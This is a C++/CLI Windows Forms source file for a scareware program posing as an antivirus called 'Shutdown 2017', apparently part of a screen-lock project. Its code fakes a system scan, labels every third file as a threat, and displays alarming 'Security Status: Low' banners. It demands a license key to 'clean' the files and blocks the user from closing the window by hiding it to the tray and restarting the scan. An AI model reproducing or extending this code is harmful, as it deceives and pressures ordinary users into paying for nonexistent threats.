/*
	@title
		AHXRScreenLock
	@author
		AHXR (https://github.com/AHXR)
	@copyright
		2017

	AHXRScreenLock is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	AHXRScreenLock is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with AHXRScreenLock.  If not, see <http://www.gnu.org/licenses/>.
*/
//=======================================================
#pragma once

#include <iostream>

namespace AHXRShutdown {

	using namespace System;
	using namespace System::ComponentModel;
	using namespace System::Collections;
	using namespace System::Windows::Forms;
	using namespace System::Data;
	using namespace System::Drawing;

	/// <summary>
	/// Summary for frmMain
	/// </summary>
	public ref class frmMain : public System::Windows::Forms::Form
	{
	public:
		frmMain(void)
		{
			InitializeComponent();
			//
			//TODO: Add the constructor code here
			//
		}

	protected:
		/// <summary>
		/// Clean up any resources being used.
		/// </summary>
		~frmMain()
		{
			if (components)
			{
				delete components;
			}
		}
	private: System::Windows::Forms::Panel^  panel1;
	protected:
	private: System::Windows::Forms::PictureBox^  pictureBox1;
	private: System::Windows::Forms::Label^  lblTitle;
	private: System::Windows::Forms::Panel^  panel2;
	private: System::Windows::Forms::Panel^  panel3;
	private: System::Windows::Forms::Label^  label1;
	private: System::Windows::Forms::Label^  label2;
	private: System::Windows::Forms::Panel^  panel4;
	private: System::Windows::Forms::PictureBox^  pictureBox2;
	private: System::Windows::Forms::Button^  btnScan;
	public: System::Windows::Forms::ListBox^  lstScan;
	private:


	private: System::Windows::Forms::Timer^  tmrUpdate;
	private: System::Windows::Forms::Panel^  panel5;
	private: System::Windows::Forms::Label^  lblStatus;
	private: System::Windows::Forms::NotifyIcon^  notifyIcon1;




	private: System::ComponentModel::IContainer^  components;









	private:
		/// <summary>
		/// Required designer variable.
		/// </summary>


#pragma region Windows Form Designer generated code
		/// <summary>
		/// Required method for Designer support - do not modify
		/// the contents of this method with the code editor.
		/// </summary>
		void InitializeComponent(void)
		{
			this->components = (gcnew System::ComponentModel::Container());
			System::ComponentModel::ComponentResourceManager^  resources = (gcnew System::ComponentModel::ComponentResourceManager(frmMain::typeid));
			this->panel1 = (gcnew System::Windows::Forms::Panel());
			this->pictureBox1 = (gcnew System::Windows::Forms::PictureBox());
			this->lblTitle = (gcnew System::Windows::Forms::Label());
			this->panel2 = (gcnew System::Windows::Forms::Panel());
			this->panel5 = (gcnew System::Windows::Forms::Panel());
			this->lblStatus = (gcnew System::Windows::Forms::Label());
			this->lstScan = (gcnew System::Windows::Forms::ListBox());
			this->panel4 = (gcnew System::Windows::Forms::Panel());
			this->btnScan = (gcnew System::Windows::Forms::Button());
			this->pictureBox2 = (gcnew System::Windows::Forms::PictureBox());
			this->panel3 = (gcnew System::Windows::Forms::Panel());
			this->label2 = (gcnew System::Windows::Forms::Label());
			this->label1 = (gcnew System::Windows::Forms::Label());
			this->tmrUpdate = (gcnew System::Windows::Forms::Timer(this->components));
			this->notifyIcon1 = (gcnew System::Windows::Forms::NotifyIcon(this->components));
			this->panel1->SuspendLayout();
			(cli::safe_cast<System::ComponentModel::ISupportInitialize^>(this->pictureBox1))->BeginInit();
			this->panel2->SuspendLayout();
			this->panel5->SuspendLayout();
			this->panel4->SuspendLayout();
			(cli::safe_cast<System::ComponentModel::ISupportInitialize^>(this->pictureBox2))->BeginInit();
			this->panel3->SuspendLayout();
			this->SuspendLayout();
			// 
			// panel1
			// 
			this->panel1->BackColor = System::Drawing::Color::Red;
			this->panel1->Controls->Add(this->pictureBox1);
			this->panel1->Controls->Add(this->lblTitle);
			this->panel1->Location = System::Drawing::Point(-10, -16);
			this->panel1->Name = L"panel1";
			this->panel1->Size = System::Drawing::Size(864, 109);
			this->panel1->TabIndex = 0;
			// 
			// pictureBox1
			// 
			this->pictureBox1->Image = (cli::safe_cast<System::Drawing::Image^>(resources->GetObject(L"pictureBox1.Image")));
			this->pictureBox1->Location = System::Drawing::Point(22, 22);
			this->pictureBox1->Name = L"pictureBox1";
			this->pictureBox1->Size = System::Drawing::Size(97, 78);
			this->pictureBox1->SizeMode = System::Windows::Forms::PictureBoxSizeMode::StretchImage;
			this->pictureBox1->TabIndex = 1;
			this->pictureBox1->TabStop = false;
			// 
			// lblTitle
			// 
			this->lblTitle->AutoSize = true;
			this->lblTitle->Font = (gcnew System::Drawing::Font(L"Trebuchet MS", 18, System::Drawing::FontStyle::Bold, System::Drawing::GraphicsUnit::Point,
				static_cast<System::Byte>(0)));
			this->lblTitle->ForeColor = System::Drawing::Color::White;
			this->lblTitle->ImageAlign = System::Drawing::ContentAlignment::MiddleLeft;
			this->lblTitle->Location = System::Drawing::Point(134, 46);
			this->lblTitle->Name = L"lblTitle";
			this->lblTitle->Size = System::Drawing::Size(188, 29);
			this->lblTitle->TabIndex = 0;
			this->lblTitle->Text = L"Shutdown 2017";
			// 
			// panel2
			// 
			this->panel2->BackColor = System::Drawing::Color::White;
			this->panel2->Controls->Add(this->panel5);
			this->panel2->Controls->Add(this->lstScan);
			this->panel2->Controls->Add(this->panel4);
			this->panel2->Controls->Add(this->panel3);
			this->panel2->Location = System::Drawing::Point(-7, 93);
			this->panel2->Name = L"panel2";
			this->panel2->Size = System::Drawing::Size(858, 407);
			this->panel2->TabIndex = 1;
			// 
			// panel5
			// 
			this->panel5->BackColor = System::Drawing::Color::DarkRed;
			this->panel5->Controls->Add(this->lblStatus);
			this->panel5->Location = System::Drawing::Point(4, 366);
			this->panel5->Name = L"panel5";
			this->panel5->Size = System::Drawing::Size(854, 41);
			this->panel5->TabIndex = 4;
			// 
			// lblStatus
			// 
			this->lblStatus->AutoSize = true;
			this->lblStatus->Font = (gcnew System::Drawing::Font(L"Trebuchet MS", 12, System::Drawing::FontStyle::Bold, System::Drawing::GraphicsUnit::Point,
				static_cast<System::Byte>(0)));
			this->lblStatus->ForeColor = System::Drawing::Color::White;
			this->lblStatus->Location = System::Drawing::Point(11, 6);
			this->lblStatus->Name = L"lblStatus";
			this->lblStatus->Size = System::Drawing::Size(101, 22);
			this->lblStatus->TabIndex = 6;
			this->lblStatus->Text = L"Scan Status:";
			this->lblStatus->Visible = false;
			// 
			// lstScan
			// 
			this->lstScan->Font = (gcnew System::Drawing::Font(L"Trebuchet MS", 12, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
				static_cast<System::Byte>(0)));
			this->lstScan->FormattingEnabled = true;
			this->lstScan->HorizontalScrollbar = true;
			this->lstScan->ItemHeight = 22;
			this->lstScan->Location = System::Drawing::Point(19, 89);
			this->lstScan->Name = L"lstScan";
			this->lstScan->Size = System::Drawing::Size(823, 268);
			this->lstScan->TabIndex = 4;
			this->lstScan->SelectedIndexChanged += gcnew System::EventHandler(this, &frmMain::lstScan_SelectedIndexChanged);
			// 
			// panel4
			// 
			this->panel4->BackColor = System::Drawing::Color::Brown;
			this->panel4->Controls->Add(this->btnScan);
			this->panel4->Controls->Add(this->pictureBox2);
			this->panel4->Location = System::Drawing::Point(16, 42);
			this->panel4->Name = L"panel4";
			this->panel4->Size = System::Drawing::Size(826, 37);
			this->panel4->TabIndex = 2;
			// 
			// btnScan
			// 
			this->btnScan->BackColor = System::Drawing::Color::DarkRed;
			this->btnScan->Font = (gcnew System::Drawing::Font(L"Trebuchet MS", 8.25F, System::Drawing::FontStyle::Bold, System::Drawing::GraphicsUnit::Point,
				static_cast<System::Byte>(0)));
			this->btnScan->ForeColor = System::Drawing::Color::White;
			this->btnScan->Location = System::Drawing::Point(57, 6);
			this->btnScan->Name = L"btnScan";
			this->btnScan->Size = System::Drawing::Size(748, 27);
			this->btnScan->TabIndex = 2;
			this->btnScan->Text = L"RECOMMENDATION: ALLOW SHUTDOWN 2017 TO RUN A SYSTEM SCAN TO DETECT ANY INFECTIONS"
				L"";
			this->btnScan->UseVisualStyleBackColor = false;
			this->btnScan->Click += gcnew System::EventHandler(this, &frmMain::btnScan_Click);
			// 
			// pictureBox2
			// 
			this->pictureBox2->Image = (cli::safe_cast<System::Drawing::Image^>(resources->GetObject(L"pictureBox2.Image")));
			this->pictureBox2->Location = System::Drawing::Point(3, 3);
			this->pictureBox2->Name = L"pictureBox2";
			this->pictureBox2->Size = System::Drawing::Size(40, 34);
			this->pictureBox2->SizeMode = System::Windows::Forms::PictureBoxSizeMode::StretchImage;
			this->pictureBox2->TabIndex = 1;
			this->pictureBox2->TabStop = false;
			// 
			// panel3
			// 
			this->panel3->BackColor = System::Drawing::Color::DarkRed;
			this->panel3->Controls->Add(this->label2);
			this->panel3->Controls->Add(this->label1);
			this->panel3->Location = System::Drawing::Point(16, 6);
			this->panel3->Name = L"panel3";
			this->panel3->Size = System::Drawing::Size(826, 41);
			this->panel3->TabIndex = 0;
			// 
			// label2
			// 
			this->label2->AutoSize = true;
			this->label2->Font = (gcnew System::Drawing::Font(L"Trebuchet MS", 18, System::Drawing::FontStyle::Bold, System::Drawing::GraphicsUnit::Point,
				static_cast<System::Byte>(0)));
			this->label2->ForeColor = System::Drawing::Color::White;
			this->label2->Location = System::Drawing::Point(570, 4);
			this->label2->Name = L"label2";
			this->label2->Size = System::Drawing::Size(244, 29);
			this->label2->TabIndex = 3;
			this->label2->Text = L"Antivirus Level: Low";
			// 
			// label1
			// 
			this->label1->AutoSize = true;
			this->label1->Font = (gcnew System::Drawing::Font(L"Trebuchet MS", 18, System::Drawing::FontStyle::Bold, System::Drawing::GraphicsUnit::Point,
				static_cast<System::Byte>(0)));
			this->label1->ForeColor = System::Drawing::Color::White;
			this->label1->Location = System::Drawing::Point(8, 4);
			this->label1->Name = L"label1";
			this->label1->Size = System::Drawing::Size(244, 29);
			this->label1->TabIndex = 2;
			this->label1->Text = L"Security Status: Low";
			// 
			// tmrUpdate
			// 
			this->tmrUpdate->Enabled = true;
			this->tmrUpdate->Interval = 500;
			this->tmrUpdate->Tick += gcnew System::EventHandler(this, &frmMain::tmrUpdate_Tick);
			// 
			// notifyIcon1
			// 
			this->notifyIcon1->BalloonTipIcon = System::Windows::Forms::ToolTipIcon::Info;
			this->notifyIcon1->BalloonTipText = L"Shutdown 2017 is scanning in the background";
			this->notifyIcon1->BalloonTipTitle = L"Shutdown 2017";
			this->notifyIcon1->Icon = (cli::safe_cast<System::Drawing::Icon^>(resources->GetObject(L"notifyIcon1.Icon")));
			this->notifyIcon1->Text = L"Shutdown 2017";
			this->notifyIcon1->Visible = true;
			this->notifyIcon1->MouseDoubleClick += gcnew System::Windows::Forms::MouseEventHandler(this, &frmMain::notifyIcon1_MouseDoubleClick);
			// 
			// frmMain
			// 
			this->AutoScaleDimensions = System::Drawing::SizeF(6, 13);
			this->AutoScaleMode = System::Windows::Forms::AutoScaleMode::Font;
			this->ClientSize = System::Drawing::Size(847, 495);
			this->Controls->Add(this->panel2);
			this->Controls->Add(this->panel1);
			this->Icon = (cli::safe_cast<System::Drawing::Icon^>(resources->GetObject(L"$this.Icon")));
			this->MaximizeBox = false;
			this->MinimizeBox = false;
			this->Name = L"frmMain";
			this->Text = L"Shutdown 2017";
			this->FormClosing += gcnew System::Windows::Forms::FormClosingEventHandler(this, &frmMain::frmMain_FormClosing);
			this->FormClosed += gcnew System::Windows::Forms::FormClosedEventHandler(this, &frmMain::frmMain_FormClosed);
			this->Load += gcnew System::EventHandler(this, &frmMain::frmMain_Load);
			this->panel1->ResumeLayout(false);
			this->panel1->PerformLayout();
			(cli::safe_cast<System::ComponentModel::ISupportInitialize^>(this->pictureBox1))->EndInit();
			this->panel2->ResumeLayout(false);
			this->panel5->ResumeLayout(false);
			this->panel5->PerformLayout();
			this->panel4->ResumeLayout(false);
			(cli::safe_cast<System::ComponentModel::ISupportInitialize^>(this->pictureBox2))->EndInit();
			this->panel3->ResumeLayout(false);
			this->panel3->PerformLayout();
			this->ResumeLayout(false);

		}
#pragma endregion
	private: System::Void btnScan_Click(System::Object^  sender, System::EventArgs^  e) {
		MessageBox::Show( "SHUTDOWN 2017 WILL ONLY BE DOING A QUICK SCAN AND WILL NOT CLEAN ANY OF YOUR INFECTED FILES. TO CLEAN YOUR FILES, YOU WILL NEED A LICENSE KEY", "SHUTDOWN 2017", MessageBoxButtons::OK);
		resetScanVariables();
		startComputerScan();
		this->btnScan->Enabled = false;
		this->lblStatus->Visible = true;
	}
private: System::Void frmMain_Load(System::Object^  sender, System::EventArgs^  e) {
	if (b_closed) {
		this->btnScan->Enabled = false;
		this->lblStatus->Visible = true;
	}
}

private: System::Void tmrUpdate_Tick(System::Object^  sender, System::EventArgs^  e) {
	if (i_scan_idx != v_files.size() ) {


		/*
			Added some realism to the fake scan by letting it pick an exe after a certain
			index was passed through. The timer will also be adjusted for the sake of scan length.
		*/
		if (i_list_num == 2) {
			i_list_num = 0;
			this->lstScan->Items->Add(gcnew String(v_files[i_scan_idx].c_str()));
			i_files_threats++;
		}
			
		i_list_num++;
		i_scan_idx++;
		i_files_scanned++;

		std::string
			s_scan_status
		;
		s_scan_status = "Scan Status: " + std::to_string(i_files_scanned) + " files scanned | " + std::to_string(i_files_threats) + " threats found";
		this->lblStatus->Text = gcnew String(s_scan_status.c_str());

		srand(static_cast< unsigned int >(time(NULL)));
		this->tmrUpdate->Interval = rand() % 500 + 100;
	}
}
private: System::Void frmMain_FormClosed(System::Object^  sender, System::Windows::Forms::FormClosedEventArgs^  e) {
	CloseHandle(h_update);
	CloseHandle(c_handle);
	b_closed = true;
}
private: System::Void notifyIcon1_MouseDoubleClick(System::Object^  sender, System::Windows::Forms::MouseEventArgs^  e) {
	this->Show();
}
private: System::Void frmMain_FormClosing(System::Object^  sender, System::Windows::Forms::FormClosingEventArgs^  e) {
	e->Cancel = true;
	this->Hide();
	this->notifyIcon1->ShowBalloonTip(1000);
	CloseHandle(c_handle);

	resetScanVariables();
	startComputerScan();
}
private: System::Void lstScan_SelectedIndexChanged(System::Object^  sender, System::EventArgs^  e) {
	MessageBox::Show("TO CLEAN YOUR FILES, YOU WILL NEED A LICENSE KEY", "SHUTDOWN 2017", MessageBoxButtons::OK);
	showCodeDialog();
}
};
}
